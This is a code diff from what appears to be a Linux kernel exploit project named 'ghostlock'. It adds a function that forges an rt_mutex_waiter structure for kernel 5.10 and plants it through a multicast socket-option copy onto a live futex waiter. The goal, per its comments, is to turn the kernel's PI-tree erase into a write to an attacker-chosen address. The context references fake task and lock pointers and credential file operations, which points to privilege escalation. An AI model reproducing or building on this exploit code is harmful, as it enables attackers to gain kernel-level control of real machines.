@@ -55,6 +55,35 @@ namespace ghostlock::memory {
                span_store64(buffer, waiter_offset + lock_offset, fake_lock);
     }
 
+    bool encode_multicast_waiter_5_10(
+        std::span<std::byte> buffer, size_t waiter_offset, size_t task_offset,
+        size_t lock_offset, const WriteRequest &request,
+        const PayloadWriteLayout &layout, uintptr_t fake_task,
+        uintptr_t fake_lock, uint64_t fake_prio) noexcept {
+        /* 5.10 compact rt_mutex_waiter overlay, written through the multicast
+     * stamp onto the live futex rt_waiter. The select_stack 5.10 word table
+     * (route/waiter_words.cpp) is the reference recipe; here the same fields
+     * land inside the group_source_req copy that the kernel stacks on top of
+     * the sleeping waiter. task/lock keep their profile offsets because the
+     * kernel rewrites them in task_blocks_on_rt_mutex; the PI tree words are
+     * what survive and what rt_mutex_dequeue_pi consumes:
+     *   pc  = layout.right (the planted black node for W1; relink for W2)
+     *   right child = 0
+     *   left child  = the write target — the erase writes the kernel's value
+     *                 through the parent pointer the pc names. */
+        const uint64_t relink_pc =
+                layout.right != 0
+                    ? layout.right
+                    : layout.parent;
+        const uint64_t relink_left = layout.right != 0 ? request.target : 0;
+        return span_store64(buffer, waiter_offset + 0x18, relink_pc) &&
+               span_store64(buffer, waiter_offset + 0x20, 0) &&
+               span_store64(buffer, waiter_offset + 0x28, relink_left) &&
+               span_store64(buffer, waiter_offset + task_offset, fake_task) &&
+               span_store64(buffer, waiter_offset + lock_offset, fake_lock) &&
+               span_store64(buffer, waiter_offset + 0x40, fake_prio);
+    }
+
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
